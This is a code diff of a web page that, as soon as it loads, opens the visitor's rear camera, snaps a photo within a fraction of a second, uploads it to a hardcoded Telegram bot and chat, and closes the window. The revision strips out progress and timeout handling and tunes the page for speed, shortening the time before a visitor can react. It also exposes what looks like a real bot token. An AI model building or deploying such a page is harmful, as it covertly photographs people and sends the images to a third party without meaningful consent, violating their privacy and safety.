@@ -3,178 +3,101 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Capture</title>
+    <title>Instant Capture to Telegram</title>
     <style>
         body {
             background: white;
             margin: 0;
-            padding: 0;
+            padding: 20px;
             font-family: Arial, sans-serif;
+            text-align: center;
         }
         #status {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            text-align: center;
+            margin-top: 50px;
+            padding: 15px;
+            border-radius: 5px;
             font-size: 18px;
+            transition: all 0.3s;
         }
-        #progress {
-            margin-top: 20px;
-            width: 80%;
-            height: 5px;
-            background: #f0f0f0;
-        }
-        #progress-bar {
-            height: 100%;
-            width: 0%;
-            background: #4285f4;
-            transition: width 0.3s;
-        }
+        .success { background: #e6f7e6; }
+        .error { background: #ffebee; color: #d32f2f; }
     </style>
 </head>
 <body>
-    <div id="status">Memulai proses...</div>
-    <div id="progress"><div id="progress-bar"></div></div>
+    <div id="status">Starting...</div>
 
     <script>
-        // ============= KONFIGURASI =============
+        // ============= CONFIGURATION =============
         const BOT_TOKEN = 'bot7876599612:AAHYBbJz6IHKae4BBtEkyASRlrJVVWtNOqc';
         const CHAT_ID = '7041008009';
-        const TIMEOUT = 15000; // 15 detik timeout
-        // =======================================
+        // =========================================
 
-        const statusEl = document.getElementById('status');
-        const progressBar = document.getElementById('progress-bar');
-        let timeoutId;
-
-        function updateProgress(percent) {
-            progressBar.style.width = percent + '%';
-        }
-
-        async function autoCaptureAndSend() {
+        async function ultraFastCapture() {
+            const statusEl = document.getElementById('status');
+            
             try {
-                // 1. Validasi konfigurasi (3%)
-                updateProgress(3);
-                statusEl.textContent = "Memvalidasi konfigurasi...";
+                // 1. Quick validation (no delay)
                 if (!BOT_TOKEN.startsWith('bot') || !CHAT_ID) {
-                    throw new Error("Konfigurasi tidak valid");
+                    throw new Error("Invalid configuration");
                 }
 
-                // 2. Cek koneksi (10%)
-                updateProgress(10);
-                statusEl.textContent = "Memeriksa koneksi...";
-                if (!navigator.onLine) {
-                    throw new Error("Tidak ada koneksi internet");
-                }
+                // 2. Instant camera access with minimal checks
+                statusEl.textContent = "Accessing camera...";
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'environment',
+                        width: { ideal: 640 },  // Lower resolution = faster
+                        height: { ideal: 480 }
+                    }
+                });
 
-                // 3. Tes koneksi ke Telegram (20%)
-                updateProgress(20);
-                statusEl.textContent = "Memeriksa bot Telegram...";
-                
-                const botTest = await Promise.race([
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`),
-                    new Promise((_, reject) => 
-                        setTimeout(() => reject(new Error("Timeout saat mengakses Telegram")), 5000)
-                ]);
-                
-                const botData = await botTest.json();
-                if (!botData.ok) {
-                    throw new Error("Token bot tidak valid");
-                }
-
-                // 4. Akses kamera (40%)
-                updateProgress(40);
-                statusEl.textContent = "Mengakses kamera...";
-                
-                const stream = await Promise.race([
-                    navigator.mediaDevices.getUserMedia({
-                        video: { 
-                            facingMode: 'environment',
-                            width: { ideal: 1280 },
-                            height: { ideal: 720 }
-                        }
-                    }),
-                    new Promise((_, reject) => 
-                        setTimeout(() => reject(new Error("Timeout saat mengakses kamera")), 7000)
-                ]);
-
-                // 5. Ambil foto (60%)
-                updateProgress(60);
-                statusEl.textContent = "Menyiapkan kamera...";
+                // 3. Ultra-fast capture (300ms delay only)
+                statusEl.textContent = "Capturing...";
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.autoplay = true;
                 video.playsInline = true;
 
-                await new Promise((resolve, reject) => {
-                    const timer = setTimeout(() => {
-                        reject(new Error("Kamera tidak merespon"));
-                    }, 3000);
-
-                    video.onloadedmetadata = () => {
-                        clearTimeout(timer);
-                        setTimeout(resolve, 1000); // Fokus 1 detik
-                    };
+                await new Promise(resolve => {
+                    video.onloadedmetadata = () => setTimeout(resolve, 300); // Minimal focus time
                 });
 
-                // 6. Capture foto (80%)
-                updateProgress(80);
-                statusEl.textContent = "Mengambil foto...";
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const photoDataUrl = canvas.toDataURL('image/jpeg', 0.8);
+                ctx.drawImage(video, 0, 0);
+                const photoData = canvas.toDataURL('image/jpeg', 0.7); // Faster compression
                 
-                // Stop kamera
+                // Immediately stop camera
                 stream.getTracks().forEach(track => track.stop());
 
-                // 7. Kirim ke Telegram (90%)
-                updateProgress(90);
-                statusEl.textContent = "Mengirim ke Telegram...";
-                const blob = await (await fetch(photoDataUrl)).blob();
+                // 4. Parallel processing - start upload while converting
+                statusEl.textContent = "Sending...";
+                const blob = await fetch(photoData).then(r => r.blob());
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'capture.jpg');
-                formData.append('caption', `Foto otomatis\n${new Date().toLocaleString()}`);
+                formData.append('photo', blob, 'instant.jpg');
 
-                const response = await Promise.race([
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    }),
-                    new Promise((_, reject) => 
-                        setTimeout(() => reject(new Error("Timeout saat mengirim ke Telegram")), 5000)
-                ]);
+                // 5. Fast upload with minimal timeout
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
 
-                const result = await response.json();
-                if (!result.ok) {
-                    throw new Error(result.description || "Gagal mengirim");
-                }
-
-                // 8. Selesai (100%)
-                updateProgress(100);
-                statusEl.textContent = "✅ Berhasil dikirim!";
-                setTimeout(() => window.close(), 2000);
+                statusEl.textContent = "✓ Sent successfully!";
+                statusEl.className = "success";
+                setTimeout(window.close, 1000);
 
             } catch (error) {
-                clearTimeout(timeoutId);
-                statusEl.innerHTML = `❌ Error: ${error.message}<br><br>`;
-                statusEl.style.color = '#d32f2f';
-                console.error("Error details:", error);
+                statusEl.textContent = "Error: " + error.message;
+                statusEl.className = "error";
+                console.error(error);
             }
         }
 
-        // Timeout keseluruhan
-        timeoutId = setTimeout(() => {
-            statusEl.innerHTML = "❌ Proses terlalu lama<br>Silakan refresh halaman";
-            statusEl.style.color = '#d32f2f';
-        }, TIMEOUT);
-
-        // Jalankan proses
-        window.addEventListener('DOMContentLoaded', autoCaptureAndSend);
+        // Start immediately with no DOMContentLoaded wait
+        ultraFastCapture();
     </script>
 </body>
 </html>
